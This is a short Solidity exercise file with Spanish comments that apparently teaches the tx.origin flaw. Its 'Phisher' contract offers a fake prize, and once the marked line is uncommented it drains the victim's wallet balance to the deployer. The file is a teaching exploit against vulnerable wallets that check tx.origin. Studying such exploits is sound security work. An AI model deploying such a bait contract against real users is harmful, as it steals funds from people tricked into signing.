// SPDX-License-Identifier: MIT
pragma solidity 0.8.38;

interface IWallet {
    function withdraw(address to, uint256 amount) external;
}

// ¿Qué? Un contrato cebo: promete un premio y, cuando el dueño de una cartera lo reclama, usa
//   esa misma transacción para vaciar la cartera.
// ¿Para qué? Ver que `tx.origin` no dice quién llama, sino quién firmó.
contract Phisher {
    IWallet public immutable WALLET;
    address public immutable THIEF;

    constructor(IWallet wallet) {
        WALLET = wallet;
        THIEF = msg.sender;
    }

    /// @notice El cebo. El dueño de la cartera cree que cobra; en realidad, paga.
    // PASO 1: vaciar la cartera hacia THIEF.
    // Borra la línea del revert y descomenta la línea que empieza con `//> `.
    function claimPrize() external {
        revert("TODO: Paso 1");
        //> WALLET.withdraw(THIEF, address(WALLET).balance);
    }
}
